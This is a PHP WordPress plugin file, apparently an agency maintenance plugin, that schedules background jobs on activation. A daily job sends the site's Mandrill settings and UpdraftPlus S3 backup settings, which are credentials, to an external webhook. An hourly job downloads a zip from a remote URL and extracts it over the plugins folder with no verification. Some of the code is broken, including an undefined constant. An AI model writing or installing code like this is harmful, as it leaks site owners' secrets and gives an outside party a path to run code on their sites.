<?php

//SE REGISTRA UNA ACCION PARA QUE SE EJECUTE DIARIAMENTE
register_activation_hook(__FILE__, 'optimiza_notifications_activate');

function optimiza_notifications_activate() 
{
    if (! wp_next_scheduled ( 'optimiza_notifications' )) 
		wp_schedule_event(time(), 'daily', 'optimiza_notifications');
}

add_action('optimiza_notifications', 'send_notifications_wp');

//FUNCION PARA ENVIAR LOS DATOS REFERENTES A WORDPRESS Y PLUGINS INSTALADOS
function send_notifications_wp() 
{
	$url = "https://clientes.optimizaclick.com/webhooks/data/oXocYPoOekUm4b2SV1kiibgy0HgZ5s9j3DMohP8b";
	
	$theme = strtoupper (substr(get_bloginfo('template_directory'), strpos(get_bloginfo('template_directory'), "themes") + 7));
		
	//ARRAY CON LOS DATOS DE WORDPRES, PLUGINS, MANDRILL Y UPDRAFT PLUS	
	$data = array( 
		"WORDPRESS" => array(
			'WP_VERSION' => get_bloginfo('version'), 
			'WP_THEME' => $theme, 
			'WP_PLUGINS' => get_plugins(),
			'WP_ACTIVATE_PLUGINS' => get_option("active_plugins")
			), 		
		"MANDRILL" => get_option("wpmandrill"), 
		"UPDRAFT" => get_option("updraft_s3")
		);	
		
	//SE ENVIAN LOS DATOS A LA URL DE DESTINO 
	$data_send = curl_init();
	
	curl_setopt($data_send,CURLOPT_URL, $url);
	curl_setopt($data_send,CURLOPT_POSTFIELDS, json_encode($data));

	curl_exec($data_send);
	curl_close($data_send);
}

//SE REGISTRA UNA ACCION PARA QUE SE EJECUTE CADA HORA
register_activation_hook(__FILE__, 'optimiza_auto_updates_activate');

function optimiza_auto_updates_activate() 
{
	if (! wp_next_scheduled ( 'optimiza_plugin_auto_update' )) 
		wp_schedule_event(time(), 'hourly', 'optimiza_plugin_auto_update');
}

add_action('optimiza_plugin_auto_update', 'check_update_optimiza_plugin');

function check_update_optimiza_plugin()
{
	//SE COMPRUEBA SI HAY UNA VERSION MAS ACTUAL DEL PLUGIN EN EL RESPOSITORIO PARA ACTUALIZARSE
	if(get_version_plugin() < get_repository_values("version"))
		auto_update_plugin();
}


//FUNCION PARA ACTUALIZAR EL PLUGIN
function auto_update_plugin()
{
	$link = get_repository_values("url");
	
	$file = "../wp-content/plugins/optimiza_plugin_update.zip";
	
	//SE DESCARGA EL .ZIP CON LA ULTIMA VERSION DEL PLUGIN
	file_put_contents($file, fopen($link, 'r'));
	
	$zip = new ZipArchive;
	
	//SE DESCOMPRIME Y REEMPLAZAN LOS FICHEROS DEL PLUGIN PARA DEJARLO ACTUALIZADO
	if ($zip->open($file) === TRUE) 
	{
		$zip->extractTo("../wp-content/plugins/");
		$zip->close();
	} 
	
	//SE ELIMINA EL .ZIP
	unlink($file);
	
	//SE ACTUALIZAN LOS HTACCESS AL REALIZAR LA ACTUALIZACION DEL PLUGIN
	update_htaccess_security();
}

//FUNCION QUE DEVUELVE LA VERSION ACTUAL DEL PLUGIN INSTALADO
function get_version_plugin()
{
	if ( ! function_exists( 'get_plugins' ) ) 
        require_once ABSPATH . 'wp-admin/includes/plugin.php';
	
	$plugins = get_plugins(); 
	
	return $plugins['Optimiza-Plugin-WordPress-master/migration_optimizaclick.php']["Version"];
}	

//FUNCION QUE DEVUELVE LA VERSION ACTUAL DEL PLUGIN EN EL RESPOSITORIO DE GITHUB O LA URL DE DESCARGA
function get_repository_values($data)
{	
	$content = file_get_contents(respository_url);
	
	$values = explode("|", $content);
	
	if($data == "version")
		return $values[0];
	else
		return $values[1]; 
}


?>